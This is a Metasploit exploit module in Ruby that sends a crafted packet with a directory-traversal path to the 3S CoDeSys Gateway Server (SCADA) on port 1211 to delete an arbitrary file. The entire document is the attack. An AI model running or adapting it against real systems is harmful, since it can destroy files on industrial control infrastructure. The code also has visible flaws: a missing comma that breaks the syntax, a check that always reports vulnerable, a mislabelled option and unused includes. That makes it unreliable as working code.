##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote

	Rank = ExcellentRanking
	include Msf::Exploit::EXE
	include Msf::Exploit::FileDropper
	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
				'Name' => 'SCADA 3S CoDeSys Gateway Server Arbitrary File Delete',
				'Description' => %q{
					This module exploits deletes an arbitrary file within the SCADA system
					},
				'Author' =>
					[
						'Enrique Sanchez <esanchez@accuvant.com>'
					],
				'License' => 'MSF_LICENSE',
				'References' =>
					[
						['ICSA-13-050-01', '02-19-2013']
					],
				'Platform' => 'win',
				'DisclosureDate' => 'Feb 19 2013'
				'Targets' =>
					[
						['Windows Universal S3 CoDeSyS < 2.3.9.27', { }]
					],
					'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(1211),
				OptString.new('FILEPATH', [false, 'Path to file']),
				OptString.new('FILENAME', [true, 'Filename to read'])
			], self.class
		)
	end

	def check
		return Exploit::CheckCode::Vulnerable
	end

	def delete_file(filepath, filename)
		magic_code = "\xdd\xdd"
		remote_file = nil

		if filepath == nil
			filepath = ""
		end

		pkt = magic_code << "AAAAAAAAAAAA" << [0x100].pack("L")
		print_debug("pkt.size is #{pkt.size}")
		opcode = [0x0D].pack("L")

		file = "..\\..\\" << filepath << filename << "\x00"
		print_debug("File to delete is #{file}")
		tmp_pkt = opcode << file
		pkt << tmp_pkt << "X" * (0x100 - tmp_pkt.size)
		connect
		sock.put(pkt)
		begin
			::Timeout.timeout( 5 ) do
				remote_packet = sock.read(2000)
			end
		rescue ::Timeout::Error
		end
	end

	def exploit
		print_status("Attempting to communicate with SCADA system #{rhost} on port #{rport}")
		print_status("Deleting file #{datastore['FILENAME']}")
		delete_file(datastore['FILEPATH'], datastore['FILENAME'])
	end
end
